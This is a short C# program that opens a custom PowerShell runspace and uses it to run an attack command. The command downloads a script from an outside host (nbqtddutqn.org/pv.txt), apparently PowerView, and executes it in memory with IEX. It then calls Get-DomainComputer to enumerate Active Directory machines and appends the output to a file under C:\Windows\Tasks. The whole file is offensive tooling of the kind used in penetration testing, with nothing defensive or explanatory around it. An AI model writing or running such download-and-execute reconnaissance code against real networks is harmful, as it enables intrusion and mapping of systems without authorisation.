using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;

namespace customrunspace
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("No filename argument provided.");
                return;
            }

            try
            {
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                String filen = args[0];
                if (String.IsNullOrEmpty(filen))
                {
                    Console.WriteLine("File name is empty.");
                    return;
                }

                string cmd = $"(New-Object System.Net.WebClient).DownloadString('http://nbqtddutqn.org/pv.txt') | IEX; " +
                $"Get-DomainComputer | Out-File -FilePath C:\\Windows\\Tasks\\{filen} -Append; ";


                ps.AddScript(cmd);
                var results = ps.Invoke();

                if (ps.Streams.Error.Count > 0)
                {
                    foreach (var error in ps.Streams.Error)
                    {
                        Console.WriteLine("PS Error: " + error.ToString());
                    }
                }

                rs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception: " + ex.Message);
            }
            finally
            {
                Console.WriteLine("Done");
            }
        }
    }
}
